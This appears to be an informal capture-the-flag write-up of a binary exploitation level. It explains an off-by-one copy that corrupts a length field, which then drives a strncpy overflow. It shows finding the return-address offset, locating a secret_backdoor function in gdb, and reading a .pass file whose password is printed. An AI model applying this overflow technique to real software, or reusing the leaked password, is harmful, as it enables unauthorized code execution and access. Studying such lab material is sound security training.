so the exploitation is here 

is because is set_username:



the problem is  that is write 40 octet but 
    for (int i = 0; i < 41 && buf_username[i]; i++) {
        storage[140 + i] = buf_username[i];
    }

so is write a adresse 140+40 = 180 octet is 1 one more!!!

in the function set_msg is read at adress 180 4 octet :
 size_t msg_len = (long)*(int *)(storage + 180);


and after is use the value to copy number of value in this addres

size_t msg_len = (long)*(int *)(storage + 180);
strncpy(storage, buf_msg, msg_len);



so is possible to copy how many i want from the stdin to the buffer storage

the result is that is possible to overridte the rip addresse 


so the first argument is like that :
A * 40 + MSG_LEN 


so the second argument:
is like that :
OFFSET TO RIP + ADDR RIP

so let's tru to found the eip offset :




with a pattern cyclic i found this :
pop rip   ;tak 8 element from [rsp]  put inside rip

so here :

$rsp   : 0x00007fff9b300bf8  →  0x636161626361617a ("zaacbaac"?)



And found 200 !


now i juste need the adress :

(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor

ANd found the flag :!!!

$ cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
